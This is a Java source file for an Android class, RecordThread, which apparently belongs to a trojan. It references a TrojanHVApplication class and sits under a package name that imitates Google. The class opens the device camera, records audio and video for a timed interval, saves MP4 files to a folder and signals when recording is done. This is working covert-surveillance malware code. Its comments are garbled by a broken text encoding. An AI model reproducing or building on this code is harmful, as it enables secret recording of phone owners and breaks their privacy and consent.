package com.google.security.tools;

import java.io.File;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import com.google.security.FinishReceiver;
import com.google.security.MainService;
import com.google.security.TrojanHVApplication;

import android.content.Context;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

/*
 * Function��RecordThread��Record Video
 * Author��   RongRong
 * Create Date: 2015.11.11
 * Update Date��
 * */
public class RecordThread extends Thread {

	private static final String LOGTAG = "RecordThread";
	private MediaRecorder mediarecorder;// ¼����Ƶ����
	private SurfaceHolder surfaceHolder;
	private long recordTime = 1000 * 10; // ʱ��Ϊ10����
	private SurfaceView surfaceview;// ��ʾ��Ƶ�Ŀؼ�
	private Camera mCamera;
	private Context context;

	public RecordThread(long recordTime, SurfaceView surfaceview,
			SurfaceHolder surfaceHolder, Context context) {
		this.recordTime = recordTime;
		this.surfaceview = surfaceview;
		this.surfaceHolder = surfaceHolder;
		this.context = context;
	}

	@Override
	public void run() {
		/**
		 * ��ʼ¼��
		 */
		try {
			startRecord();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		/**
		 * ������ʱ�������涨ʱ��recordTime��ִ��ֹͣ¼������
		 */
		Timer timer = new Timer();

		timer.schedule(new TimerThread(), recordTime);
	}

	/**
	 * ��ȡ����ͷʵ������
	 * 
	 * @return
	 */
	public Camera getCameraInstance() {
		Camera c = null;
		try {
			c = Camera.open();
		} catch (Exception e) {
			// ������ͷ����
			e.printStackTrace();
			Log.e(LOGTAG, "������ͷ����");
		}
		return c;
	}

	/**
	 * ��ʼ¼��
	 */
	public void startRecord() {
		mediarecorder = new MediaRecorder();// ����mediarecorder����
		mCamera = getCameraInstance();
		// ����camera
		if (mCamera != null) {
			mCamera.unlock();
			mediarecorder.setCamera(mCamera);
			// ����¼����ƵԴΪCamera(���)
			mediarecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
			mediarecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
			CamcorderProfile camcorderProfile = CamcorderProfile
					.get(CamcorderProfile.QUALITY_LOW);
			// camcorderProfile.videoFrameRate = 15;
			camcorderProfile.videoCodec = MediaRecorder.VideoEncoder.H264;
			// camcorderProfile.audioCodec = MediaRecorder.AudioEncoder.AAC;
			camcorderProfile.fileFormat = MediaRecorder.OutputFormat.MPEG_4;
			// ����¼���ļ���������ʽ���ֱ���֮�࣬���ȫ��������
			mediarecorder.setProfile(camcorderProfile);

			mediarecorder.setPreviewDisplay(surfaceHolder.getSurface());
			// ������Ƶ�ļ������·��
			mediarecorder.setOutputFile(MainService.VIDEO_FORDER_PATH
					+ File.separator + System.currentTimeMillis() / 1000
					+ ".mp4");
			try {
				// ׼��¼��
				mediarecorder.prepare();
				// ��ʼ¼��
				mediarecorder.start();
			} catch (IllegalStateException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	/**
	 * ֹͣ¼��
	 */
	public void stopRecord() {
		if (mediarecorder != null) {
			// ֹͣ¼��
			mediarecorder.stop();
			// �ͷ���Դ
			mediarecorder.release();
			mediarecorder = null;
			if (mCamera != null) {
				mCamera.release();
				mCamera = null;
			}
		}

		while (true) {
			File dir = new File(MainService.VIDEO_FORDER_PATH);
			if (dir.list().length != 0) {
				FinishReceiver.finishbroadcast("video", context);
				break;
			}
		}
	}

	/**
	 * ��ʱ��
	 * 
	 * @author bcaiw
	 * 
	 */
	class TimerThread extends TimerTask {

		/**
		 * ֹͣ¼��
		 */
		@Override
		public void run() {
			try {
				stopRecord();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			this.cancel();
		}

	}

}
